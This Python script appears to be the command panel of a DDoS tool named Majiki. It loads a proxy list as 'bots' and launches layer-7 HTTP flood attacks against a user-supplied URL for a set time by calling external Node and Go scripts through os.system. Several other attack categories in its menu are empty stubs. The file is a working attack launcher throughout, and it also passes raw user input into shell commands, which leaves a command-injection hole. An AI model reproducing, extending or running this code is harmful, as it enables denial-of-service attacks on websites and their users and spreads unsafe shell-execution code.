from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.BLUE + """
    iam vilgax
    
    """)
    time.sleep(1.8)
    clear()

def si():
    print(Fore.RED + ' hi ')

def menu():
   
    clear()
  
    print ("""
    
    • ▌ ▄ ·.  ▄▄▄·  ▐▄▄▄▪  ▄ •▄ ▪  
·██ ▐███▪▐█ ▀█   ·████ █▌▄▌▪██ 
▐█ ▌▐▌▐█·▄█▀▀█ ▪▄ ██▐█·▐▀▀▄·▐█·
██ ██▌▐█▌▐█ ▪▐▌▐▌▐█▌▐█▌▐█.█▌▐█▌
▀▀  █▪▀▀▀ ▀  ▀  ▀▀▀•▀▀▀·▀  ▀▀▀▀

""")

def main():
    menu()
    while(True):
        cnc = input('''root@Majiki : ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node http-socket.js {url} {per} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-socket <url> <per> <time>')
                

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node http-raw {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-raw <url> <time>')
            
                

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node http-rand.js {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-rand <url> <time>')
               

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run server.go -site {url} -data {method}')
            except IndexError:
                print(Fore.BLUE +'Usage: sever <url> METHODS<GET/POST>')
                

        elif "info" in cnc:
            print(f'''
            ALL METHOD : 
   LAYER 7 
http-socket
sever
http-rand
http-raw

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] not found")
            except IndexError:
                pass
main()